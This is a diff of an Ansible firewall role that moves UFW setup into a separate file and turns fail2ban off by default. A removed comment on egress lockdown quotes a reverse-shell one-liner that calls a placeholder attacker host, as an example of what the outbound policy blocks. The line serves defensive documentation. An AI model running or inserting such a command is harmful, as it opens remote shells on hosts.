@@ -1,155 +1,27 @@
 ---
-# roles/03-firewall/tasks/main.yml - ufw, then fail2ban (fail2ban.yml).
+# roles/03-firewall/tasks/main.yml - ufw (ufw.yml), then fail2ban (fail2ban.yml).
 #
-# fail2ban: role 03 writes only /etc/fail2ban/jail.d/00-autosec.conf and
-# never jail.local (issue #2). Its preflight (tasks/preflight.yml, imported
-# by site.yml pre_tasks) has already run the same checks read-only. There
-# is no handler: fail2ban is reloaded in fail2ban.yml, and only when its
-# effective config changes.
+# Both parts follow what their preflight (tasks/preflight.yml, imported by
+# site.yml pre_tasks) planned, and check the host again before they write.
+#
+# ufw: no ufw command ever runs on a ufw that is already on (#8). An
+# inactive ufw is turned on only with firewall_state: enabled, under role
+# 02's undo guard, and kept only if a brand-new SSH login works.
+#
+# fail2ban: only with fail2ban_hardening_enabled: true. Role 03 writes only
+# /etc/fail2ban/jail.d/00-autosec.conf and never jail.local (issue #2).
+# There is no handler: fail2ban is reloaded in fail2ban.yml, and only when
+# its effective config changes.
 
-- name: Install UFW
-  ansible.builtin.apt:
-    name: [ufw]
-    state: present
+- name: ufw (no command on an active ufw; turn-on only when planned)
+  ansible.builtin.include_tasks:
+    file: ufw.yml
+    apply:
+      tags: [ufw]
+  tags: [ufw]
 
-- name: UFW default deny incoming
-  community.general.ufw:
-    direction: incoming
-    policy: deny
-
-# --- Outbound policy ---------------------------------------------------
-# Default: allow all outbound (most servers need it). Optional egress
-# lockdown flips this to default-deny and only permits the ports a
-# hardened box actually needs, which stops the most common reverse
-# shells (e.g. bash -i >& /dev/tcp/attacker/4444) since arbitrary
-# high-port callbacks are refused. Note: 80/443 stay open for apt,
-# certbot, B2 and Telegram, so C2 tunnelled over 443 is NOT stopped by
-# this alone - that is what the detection layers (role 09) are for.
-- name: UFW default allow outgoing (egress lockdown disabled)
-  community.general.ufw:
-    direction: outgoing
-    policy: allow
-  when: not (egress_lockdown | default(false))
-
-- name: Egress lockdown block
-  when: egress_lockdown | default(false)
-  block:
-    - name: Allow required outbound ports (DNS, NTP, HTTP/S)
-      community.general.ufw:
-        rule: allow
-        direction: out
-        port: "{{ item.port }}"
-        proto: "{{ item.proto }}"
-      loop:
-        - { port: "53", proto: udp }
-        - { port: "53", proto: tcp }
-        - { port: "123", proto: udp }
-        - { port: "80", proto: tcp }
-        - { port: "443", proto: tcp }
-
-    - name: Allow extra outbound ports (configured per host)
-      community.general.ufw:
-        rule: allow
-        direction: out
-        port: "{{ item.port | string }}"
-        proto: "{{ item.proto | default('tcp') }}"
-      loop: "{{ egress_allow_extra | default([]) }}"
-
-    - name: UFW default deny outgoing
-      community.general.ufw:
-        direction: outgoing
-        policy: deny
-
-- name: Allow HTTP and HTTPS
-  community.general.ufw:
-    rule: allow
-    port: "{{ item }}"
-    proto: tcp
-  loop: ["80", "443"]
-
-# Both paranoia levels. In 0.4.0 fwknop (high mode) never removes this
-# rule, so SSH stays reachable, rate-limited. ssh_port is the port sshd
-# already listens on (checked by role 02's preflight in pre_tasks).
-- name: Allow SSH with rate limiting
-  community.general.ufw:
-    rule: limit
-    port: "{{ ssh_port | int }}"
-    proto: tcp
-  register: _fw_ssh_rule
-
-- name: Break-glass, allow SSH from office static IP directly
-  community.general.ufw:
-    rule: allow
-    port: "{{ ssh_port | int }}"
-    proto: tcp
-    src: "{{ office_static_ip }}"
-  when: office_static_ip | length > 0
-
-# --- First enable ------------------------------------------------------
-# `ufw enable` runs only while ufw is inactive: on an active firewall the
-# rules above are already live, and re-enabling would only reload every
-# chain. Before the first enable, refuse unless the SSH rule for ssh_port
-# was added in this run or already exists - otherwise enabling ufw would
-# cut SSH. Read-only checks; they also run in --check.
-- name: Read UFW status
-  ansible.builtin.command: ufw status
-  environment:
-    LANG: C
-    LC_ALL: C
-  register: _fw_status
-  changed_when: false
-  check_mode: false
-
-- name: Read the UFW rules added so far
-  ansible.builtin.command: ufw show added
-  environment:
-    LANG: C
-    LC_ALL: C
-  register: _fw_added
-  changed_when: false
-  check_mode: false
-  when: "'Status: active' not in _fw_status.stdout"
-
-- name: Refuse to enable UFW without an SSH rule for ssh_port
-  vars:
-    _port: "{{ ssh_port | int }}"
-    # `ufw show added` prints the short form ("ufw limit 22/tcp") for a
-    # plain port rule; accept the long form from anywhere too.
-    _rule_re: "^ufw limit (in )?({{ _port }}/tcp|(proto tcp )?(from any )?(to any )?port {{ _port }}( proto tcp)?)( comment .*)?$"
-    _rule_listed: "{{ _fw_added.stdout_lines | default([]) | select('match', _rule_re) | list | length > 0 }}"
-    _rule_ok_this_run: "{{ _fw_ssh_rule is defined and _fw_ssh_rule is not skipped and _fw_ssh_rule is succeeded }}"
-  ansible.builtin.assert:
-    quiet: true
-    that:
-      - _rule_ok_this_run | bool or _rule_listed | bool
-    fail_msg: >-
-      Refusing to enable ufw: no SSH rule for ssh_port {{ ssh_port }} was
-      added in this run or found in `ufw show added`. Enabling ufw now
-      would cut SSH. ufw is still inactive.
-  when: "'Status: active' not in _fw_status.stdout"
-
-# Defence in depth: role 02's preflight already refused a connection that
-# reached sshd on another port. 0 = local mode, or the port is not known.
-- name: Refuse to enable UFW when Ansible reached sshd on another port
-  ansible.builtin.assert:
-    quiet: true
-    that:
-      - (_ssh_server_port | default(0) | int) in [0, ssh_port | int]
-    fail_msg: >-
-      Refusing to enable ufw: Ansible is connected to sshd on port
-      {{ _ssh_server_port | default('?') }}, but ssh_port is {{ ssh_port }} and only that
-      port gets a firewall rule. Set ssh_port to the port sshd really uses.
-      ufw is still inactive.
-  when: "'Status: active' not in _fw_status.stdout"
-
-- name: Enable UFW (only while it is inactive)
-  community.general.ufw:
-    state: enabled
-  when: "'Status: active' not in _fw_status.stdout"
-
-# --- fail2ban ---------------------------------------------------------
 - name: fail2ban (jail.d/00-autosec.conf; never jail.local)
-  when: _f2b_enabled | default(true) | bool
+  when: _f2b_enabled | default(false) | bool
   ansible.builtin.include_tasks:
     file: fail2ban.yml
     apply:
